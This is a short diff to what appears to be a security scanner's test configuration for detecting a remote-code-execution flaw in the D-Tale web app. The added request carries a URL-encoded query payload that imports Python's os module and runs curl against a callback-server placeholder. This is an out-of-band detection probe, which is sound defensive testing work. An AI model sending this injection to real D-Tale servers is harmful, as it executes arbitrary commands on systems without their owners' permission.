@@ -34,7 +34,12 @@ tests: {
         }
       },
       {
-        uri: "/dtale/chart-data/112233?query={{ payload }}"
+        uri: "/dtale/chart-data/112233?query=%40pd.core.frame.com.builtins.__import__%28%22os%22%29.system%28%22%22%22curl%20{{ T_CBS_URI }}%20%23%22%22%22%29"
+        status: 200
+        body_content: "\"error\":\""
+      },
+      {
+        uri: "TSUNAMI_MAGIC_ANY_URI"
         status: 200
         body_content: "\"error\":\""
       }
